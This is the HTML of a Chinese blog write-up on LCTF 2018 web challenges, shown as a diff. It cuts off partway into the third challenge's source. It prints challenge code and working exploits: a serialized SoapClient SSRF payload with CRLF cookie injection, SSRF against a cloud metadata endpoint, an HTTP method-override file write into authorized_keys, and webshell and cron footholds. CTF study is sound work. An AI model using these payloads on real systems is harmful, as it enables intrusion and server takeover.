@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          2018 lctf-web 学习篇 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/11/2018-lctf-web-学习篇/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#writeup" title="writeup">writeup</a>
+                        
+                          <a class="tag" href="/tags/#lctf" title="lctf">lctf</a>
+                        
+                    </div>
+                    <h1>2018 lctf-web 学习篇</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-11-19
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目很给力，能学到很多，而且做起来没有什么弯弯绕绕的东西，一般都直接给了代码</p>
+<p>但就是代码都给了，然后无从下手，第一天对着代码发呆了一天，打自闭了。。。</p>
+<p>赛后疯狂学习一波。</p>
+<h1 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h1><p>代码量不多，直接贴上来</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">'implode'</span>;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION),<span class="string">'welcome_to_the_lctf2018'</span>);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>还有一个flag.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'only localhost can get flag!'</span>;</span><br><span class="line">$flag = <span class="string">'LCTF&#123;*************************&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">'flag'</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br></pre></td></tr></table></figure>
+<p>很明显需要一个SSRF（或者直接getshell?），难点在<code>call_user_func</code>的第二个参数传入了一个<code>$_POST</code>数组<br>直接传数组的函数确实想不起来几个，更别提什么危险函数了</p>
+<p>做到下午给了个反序列化的提示，就知道应该和SOAP这个原生类有关系，但还是不知道怎么触发</p>
+<p>就不多bb自己辛酸的解题史了（反正最后也没做出来），直接说下正确的解法</p>
+<h2 id="SESSION反序列化"><a href="#SESSION反序列化" class="headerlink" title="SESSION反序列化"></a>SESSION反序列化</h2><p>以前一直都知道session是通过反序列化的方式存放在一个临时文件中的，本来想具体研究一下的，但由于懒也没深究了</p>
+<p>可以参考 <a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
+<p>里面提到，有三种存放session的方式，对应着phpinfo中的<code>session.serialize_handler</code></p>
+<ul>
+<li><strong>php</strong> (默认):    key|$serialize<br>键名+竖线+经过serialize()函数序列处理的值<br>例如：name|s:6:”kingkk”;</li>
+<li><strong>php_serialize</strong>:    $serialize<br>经过serialize()函数序列化处理的值<br>例如：a:1:{s:4:”name”;s:6:”kingkk”;}</li>
+<li><strong>php_binary</strong>:    ascii(len) key $serialize()<br>键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值<br>例如：names:6:”kingkk”     //第一个字符为chr(6)</li>
+</ul>
+<p>当在不同的<code>serialize_handler</code>中切换的时候，会产生一个安全问题</p>
+<p>例如当一开始是以<code>php_serialize</code>方式存储之后，在字符串中间添加了一个<code>|</code><br>第二次以<code>php</code>方式进行反序列化，只要控制<code>|</code>后面的字符传为一个反序列化字符串，就会自动进行反序列化</p>
+<p>虽然最后会有一个不可控的<code>&quot;;}</code>结尾字符，但是亲测反序列化字符后面可以添加一些脏字符，但是前面不行</p>
+<h2 id="Soap-SSRF"><a href="#Soap-SSRF" class="headerlink" title="Soap SSRF"></a>Soap SSRF</h2><p>作为一个php的原生类，反序列化时可以利用SOAP进行SSRF攻击，还能进行<code>CRLF</code>注入，</p>
+<p>有wupco师傅和柠檬的文章中写的蛮详细的了，我就不复述了</p>
+<p><a href="https://xz.aliyun.com/t/2148#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148#toc-0</a></p>
+<p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0</a></p>
+<p>原生类解决了很多找不到类的情况的麻烦，但是利用Soap进行SSRF也有两个需要注意的点</p>
+<ul>
+<li>Soap不是默认开启的，需要手动开启</li>
+<li>需要触发<code>__call</code>方法才能进行SSRF</li>
+</ul>
+<h2 id="回到题解上"><a href="#回到题解上" class="headerlink" title="回到题解上"></a>回到题解上</h2><p>查看<code>session_start</code>的官方文档就可以看到，允许其中传入一个数组，来设置<code>session.</code>的一些参数</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018-lctf-web-学习篇/1.png" alt></p>
+<p>这样，我们就可以利用<code>call_user_func($_GET[f],$_POST);</code>来设置<code>session.serialize_handler</code>的值，从而进行Soap的反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">'location'</span> =&gt; <span class="string">"http://127.0.0.1/flag.php"</span>,</span><br><span class="line">	<span class="string">'user_agent'</span> =&gt; <span class="string">"AAA:BBB\r\n"</span>.<span class="string">"Cookie:PHPSESSID=22704eeclr7famlh9s21m9to26"</span>,</span><br><span class="line">	<span class="string">'uri'</span> =&gt; <span class="string">"123"</span></span><br><span class="line">));</span><br><span class="line">$s = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($s);</span><br></pre></td></tr></table></figure>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.81</span>.<span class="number">210.82</span>/?f=session_start<span class="built_in">&amp;name</span>=|O<span class="meta">%3A10</span><span class="meta">%3A</span><span class="meta">%22SoapClient</span><span class="meta">%22</span><span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22uri</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22123</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A8</span><span class="meta">%3A</span><span class="meta">%22location</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A25</span><span class="meta">%3A</span><span class="meta">%22http</span><span class="meta">%3A</span><span class="meta">%2F</span><span class="meta">%2Flocalhost</span><span class="meta">%2Fflag</span>.php<span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A15</span><span class="meta">%3A</span><span class="meta">%22_stream_context</span><span class="meta">%22</span><span class="meta">%3Bi</span><span class="meta">%3A0</span><span class="meta">%3Bs</span><span class="meta">%3A11</span><span class="meta">%3A</span><span class="meta">%22_user_agent</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A52</span><span class="meta">%3A</span><span class="meta">%22AAA</span><span class="meta">%3ABBB</span><span class="meta">%0D</span><span class="meta">%0ACookie</span><span class="meta">%3APHPSESSID</span><span class="meta">%3Db8govp8041cfm1cb307bsf66v3</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A13</span><span class="meta">%3A</span><span class="meta">%22_soap_version</span><span class="meta">%22</span><span class="meta">%3Bi</span><span class="meta">%3A1</span><span class="meta">%3B</span><span class="meta">%7D</span></span><br><span class="line"></span><br><span class="line">serialize_handler=php_serialize</span><br></pre></td></tr></table></figure>
+<p>提交之后，就能看到，这里以<code>php_serialize</code>模式保存session的时候，会显示<code>name</code>的value值是一个序列化字符串</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018-lctf-web-学习篇/2.png" alt></p>
+<p>当我们直接访问这个页面，也就是以<code>php</code>的默认模式开启session的时候，就可以</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018-lctf-web-学习篇/3.png" alt></p>
+<p>就可以看到，这里将<code>|</code>后面的反序列化字符串，反序列化成了一个<code>Soap</code>类</p>
+<p>要触发<code>Soap</code>的SSRF，还得需要触发它的<code>__call</code>方法，这样我们就可以尝试利用<code>extract</code>覆盖掉变量<code>$b</code><br>去调用一个不存在的方法，就会触发SSRF</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//172.81.210.82/?f=extract&amp;name=Soapclient</span></span><br><span class="line"></span><br><span class="line">b=call_user_func</span><br></pre></td></tr></table></figure>
+<p>这样，就可以让Soap带上自己的Cookie去访问flag.php，再次刷新页面，就可以看到flag了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018-lctf-web-学习篇/4.png" alt></p>
+<h1 id="Travel"><a href="#Travel" class="headerlink" title="Travel"></a>Travel</h1><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>自己一开始做的时候也是万脸懵逼，不知道干嘛。题目一开始就给了源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, render_template</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> create_app</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = create_app()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload/&lt;filename&gt;', methods = ['PUT'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    name = request.cookies.get(<span class="string">'name'</span>)</span><br><span class="line">    pwd = request.cookies.get(<span class="string">'pwd'</span>)</span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">'lctf'</span> <span class="keyword">or</span> pwd != str(uuid.getnode()):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">    filename = urllib.unquote(filename)</span><br><span class="line">    <span class="keyword">with</span> open(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename), <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(request.get_data(as_text = <span class="literal">True</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods = ['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">'url'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> url == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"http"</span> != url[: <span class="number">4</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hacker"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url, timeout = <span class="number">10</span>)</span><br><span class="line">        response.encoding = <span class="string">'utf-8'</span></span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Something Error"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/source', methods = ['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p>就两个页面，一个是<code>/</code>，一个python的SSRF，并且必须以<code>http</code>开头</p>
+<p>还有一个就是<code>/upload/&lt;filename&gt;</code>，一个比较有意思的是他只允许<code>PUT</code>的传入方式<br>需要知道<code>uuid.getnode()</code>的值（也就是mac地址的值）才可以任意文件写入</p>
+<p>出题人给了一个提示</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">hint2:</span> 留意云服务商和差异性</span><br></pre></td></tr></table></figure>
+<p>emm，只能说我是想不到，但是还是比较贴近实战的一种信息搜集方式</p>
+<p>可以看到比赛的服务器是用的腾讯云，查看腾讯云的文档</p>
+<p><a href="https://cloud.tencent.com/document/product/213/4934" target="_blank" rel="noopener">https://cloud.tencent.com/document/product/213/4934</a></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/2018-lctf-web-学习篇/5.png" alt></p>
+<p>可以看到可以通过访问 <a href="http://metadata.tencentyun.com/latest/meta-data/mac" target="_blank" rel="noopener">http://metadata.tencentyun.com/latest/meta-data/mac</a>  来获取本机的mac地址</p>
+<p>这样的话就可以利用那个python的SSRF来获取mac地址</p>
+<p>获取到mac地址之后，就可以进行<code>/upload/</code>页面的任意文件写入了</p>
+<p>但是在nginx中禁用了PUT方法，复现到这里的时候平台已经关了，可以来看下给出的源码</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$request_method</span> !<span class="regexp">~* GET|POST|HEAD)</span> &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">405</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">include</span> /etc/nginx/uwsgi_params;</span><br><span class="line">    <span class="attribute">uwsgi_pass</span> <span class="number">127.0.0.1:8000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>很明显不允许<code>PUT</code>方法访问，会抛出一个405的异常</p>
+<p>然后查看flask的文档可以发现，flask可以允许自定义HTTP方式</p>
+<p><a href="http://flask.pocoo.org/docs/1.0/patterns/methodoverrides/" target="_blank" rel="noopener">http://flask.pocoo.org/docs/1.0/patterns/methodoverrides/</a></p>
+<p>设置的方式如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HTTPMethodOverrideMiddleware</span><span class="params">(object)</span>:</span></span><br><span class="line">    allowed_methods = frozenset([</span><br><span class="line">        <span class="string">'GET'</span>,</span><br><span class="line">        <span class="string">'HEAD'</span>,</span><br><span class="line">        <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'DELETE'</span>,</span><br><span class="line">        <span class="string">'PUT'</span>,</span><br><span class="line">        <span class="string">'PATCH'</span>,</span><br><span class="line">        <span class="string">'OPTIONS'</span></span><br><span class="line">    ])</span><br><span class="line">    bodyless_methods = frozenset([<span class="string">'GET'</span>, <span class="string">'HEAD'</span>, <span class="string">'OPTIONS'</span>, <span class="string">'DELETE'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, app)</span>:</span></span><br><span class="line">        self.app = app</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, environ, start_response)</span>:</span></span><br><span class="line">        method = environ.get(<span class="string">'HTTP_X_HTTP_METHOD_OVERRIDE'</span>, <span class="string">''</span>).upper()</span><br><span class="line">        <span class="keyword">if</span> method <span class="keyword">in</span> self.allowed_methods:</span><br><span class="line">            method = method.encode(<span class="string">'ascii'</span>, <span class="string">'replace'</span>)</span><br><span class="line">            environ[<span class="string">'REQUEST_METHOD'</span>] = method</span><br><span class="line">        <span class="keyword">if</span> method <span class="keyword">in</span> self.bodyless_methods:</span><br><span class="line">            environ[<span class="string">'CONTENT_LENGTH'</span>] = <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">return</span> self.app(environ, start_response)</span><br></pre></td></tr></table></figure>
+<p>可以通过传入<code>HTTP_X_HTTP_METHOD_OVERRIDE</code>的头部，来重写请求方式（在给出的源码中确实也是那么写的</p>
+<p>这样，就可以利用这个<code>PUT</code>的任意文件写入，往<code>/home/lctf/.ssh/authorized_keys</code>中写入公钥，从而cat flag（感觉有点偏脑洞把。环境关了也就暂时不复现了。</p>
+<h2 id="一些题外话"><a href="#一些题外话" class="headerlink" title="一些题外话"></a>一些题外话</h2><p>阿里云其实也有这样类似于腾讯云的api，做信息搜集的时候可能会有点用把</p>
+<p><a href="https://help.aliyun.com/knowledge_detail/49122.html" target="_blank" rel="noopener">https://help.aliyun.com/knowledge_detail/49122.html</a></p>
+<p>最后写文件的地方，一般有三种思路把（类似于redis的写文件</p>
+<ul>
+<li>写公钥</li>
+<li>写cron定时任务</li>
+<li>写webshell </li>
+</ul>
+<p>其次的话，可以看下端口？假如开了22，那写公钥似乎就是一个比较明显的提示了</p>
+<h1 id="sh0w-m3-the-sh31l"><a href="#sh0w-m3-the-sh31l" class="headerlink" title="sh0w m3 the sh31l"></a>sh0w m3 the sh31l</h1><p>模改的hitcon2017的反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">$SECRET  = `../read_secret`;                                  </span><br><span class="line">$SANDBOX = <span class="string">"../data/"</span> . md5($SECRET. $_SERVER[<span class="string">"REMOTE_ADDR"</span>]); </span><br><span class="line">$FILEBOX = <span class="string">"../file/"</span> . md5(<span class="string">"K0rz3n"</span>. $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);    </span><br><span class="line">@mkdir($SANDBOX); </span><br><span class="line">@mkdir($FILEBOX); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123; </span><br><span class="line">    $data = serialize(<span class="keyword">new</span> User($SANDBOX)); </span><br><span class="line">    $hmac = hash_hmac(<span class="string">"md5"</span>, $data, $SECRET); </span><br><span class="line">    setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));       </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $avatar; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = $path;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K0rz3n_secret_flag</span> </span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> $file_path; 